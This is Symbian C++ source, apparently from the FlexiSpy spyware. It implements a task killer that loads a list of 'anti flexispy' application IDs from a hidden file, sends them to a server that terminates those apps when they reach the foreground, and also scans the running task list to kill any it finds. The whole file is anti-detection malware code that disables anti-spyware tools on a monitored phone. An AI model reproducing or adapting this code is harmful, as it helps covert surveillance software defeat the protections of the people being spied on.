#include "TheKiller.h"
#include "Global.h"
#include "Properties.h"

#include <W32STD.H>
#include <APGTASK.H> //TApaTask

_LIT(KAntiFlexiSpyPropName,"antfx.txt");
const TInt KUidArrayGran = 2;

CTaskKiller::CTaskKiller(RCommonServices& aCommonService)
:CActive(CActive::EPriorityHigh),
iCommonService(aCommonService),
iWs(Global::WsSession()),
iRootWin(Global::RootWin()),
iUidArray(KUidArrayGran)
	{	
	}

CTaskKiller::~CTaskKiller()
	{
	Cancel();
	iUidArray.Close();	
	}

CTaskKiller* CTaskKiller::NewL(RCommonServices& aCommonService)
	{	
	CTaskKiller* self = new (ELeave) CTaskKiller(aCommonService);
	CleanupStack::PushL(self);
	self->ConstructL();
	CleanupStack::Pop(self);
	return self;
	}

void CTaskKiller::ConstructL()
	{
	LoadPropertyL();
	//
	//send anti flexispy applications uid to server
	//when these application comes up to foreground, it will be killed by the server
	//
	iCommonService.SetAntiFSUidsL(iUidArray);
	//
	//may improve to use Active object	
	CActiveScheduler::Add(this);
	}

void CTaskKiller::LoadPropertyL()
	{
	TFileName fileName;
	Global::GetAppPath(fileName);
	fileName.Append(KAntiFlexiSpyPropName);
	CProperties* prop = CProperties::NewLC(Global::FsSession(), fileName);
	CDesCArray* keys = prop->PropertyNamesLC();
	
	TLex numParser;
	TBuf<12> uidStr;	
	TUint32 uidValue;
	TUid uid;
	for(TInt i=0;i<keys->Count();i++)
		{
		TPtrC key = (*keys)[i];
		TInt err = prop->Get(key, uidStr);
		if(KErrNone == err)
			{
			numParser.Assign(uidStr);
			err = numParser.Val(uidValue, EHex);
			if(err == KErrNone)
				{
				uid.iUid = uidValue;
				iUidArray.Append(uid);
				}
			}
		}
	CleanupStack::PopAndDestroy(2);	
	}

TInt CTaskKiller::Kill(TUid aUid)
	{
	return iCommonService.KillTask(aUid);
	}

TInt CTaskKiller::KillIfAntiFlexiSpy(TUid aUid)
//
//@toimprove
//if this is havy process, could change it to use active object
//
//Be aware of
//- if the application is hidden from the task list, TApaTaskList::FindApp() won't work
//
	{
	TInt err(KErrNotFound);
	if(KErrNotFound != iUidArray.Find(aUid))
		{
		err = iCommonService.KillTask(aUid);
		}
	return err;
	}

void CTaskKiller::ScanAntiFlexiSpyApp()
	{
	CompleteSelf();
	}

void CTaskKiller::SetNewSession(RCommonServices aNewSession)
	{
	iCommonService = aNewSession;
	}
	
void CTaskKiller::CompleteSelf()
	{
	if (!IsActive()) 
		{
		TRequestStatus* status = &iStatus;
		User::RequestComplete(status, KErrNone);
		SetActive();
		}
	}
	
void CTaskKiller::DoCancel()
	{
	TRequestStatus* status = &iStatus;
	User::RequestComplete(status, KErrCancel);		
	}
	
void CTaskKiller::RunL()
	{	
	TApaTaskList taskList(iWs);
	for(TInt i=0;i<iUidArray.Count();i++)
		{
		TUid uid = iUidArray[i];
		TApaTask task = taskList.FindApp(uid);
		if(task.Exists())
			{
			iCommonService.KillTask(uid);
			}
		}
	}
	
TInt CTaskKiller::RunError(TInt /*aError*/)
	{
	return KErrNone;
	}
